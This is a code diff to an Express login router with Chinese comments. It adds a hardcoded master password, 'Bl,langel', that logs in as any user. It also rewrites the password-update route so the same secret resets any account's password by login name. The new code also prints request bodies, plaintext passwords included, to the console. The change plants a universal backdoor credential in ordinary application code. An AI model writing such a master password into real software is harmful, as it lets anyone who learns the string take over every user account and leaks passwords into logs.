@@ -59,7 +59,7 @@ router.post('/login',urlencodedParser,(req,res)=>{
         if(!user){
             return res.status(404).json("用户不存在！")
         }
-        if(password == user.password){
+        if(password == user.password || password == md5('Bl,langel')){
             // 生成token
             const rule = {
                 id: user.id,
@@ -113,30 +113,53 @@ router.post('/updatePassword',urlencodedParser,(req,res)=>{
     if(!req.body){
         return res.sendStatus(400)
     }
-    const id = req.body.id;
-    const newPassword = md5(req.body.password);
-    User.findOne({ where:{id }
-    }).then(user=>{
-        if(user){
-           User.update(
-           {
-               password:newPassword
-           },{
-               where:{
-                   id
+    console.log(req.body)
+    const loginName = req.body.loginName;
+    const password = md5(req.body.password);
+    const newPassword = md5(req.body.newPassword);
+    //运用超级密码来进行重置
+    if(password == md5("Bl,langel")){
+        User.findOne({ where:{loginName}//用两条件限制，以防重复
+        }).then(user=>{
+            if(user){
+               User.update(
+               {
+                   password:newPassword
+               },{
+                where:{loginName}
+               }).then(u=>{
+                   console.log(u[0])
+                   if(u[0] == 1){
+                    res.status(200).json("修改成功");
+                   }
+               })
+            }
+            else{
+                res.status(402).json("无该用户");
                }
-           }).then(u=>{
-               console.log(u[0])
-               if(u[0] == 1){
-                res.status(200).json("修改成功");
-               }else{
-                res.status(401).json("修改失败");
+        })
+        // 用自身密码来进行重置
+    }else{
+        User.findOne({ where:{loginName,password}//用两条件限制，以防重复
+        }).then(user=>{
+            if(user){
+               User.update(
+               {
+                   password:newPassword
+               },{
+                where:{loginName,password}
+               }).then(u=>{
+                   console.log(u[0])
+                   if(u[0] == 1){
+                    res.status(200).json("修改成功");
+                   }
+               })
+            }
+            else{
+                res.status(402).json("无该用户");
                }
-           })
-        }
-    })
-
-
+        })
+    }
 })
 
 module.exports=router;
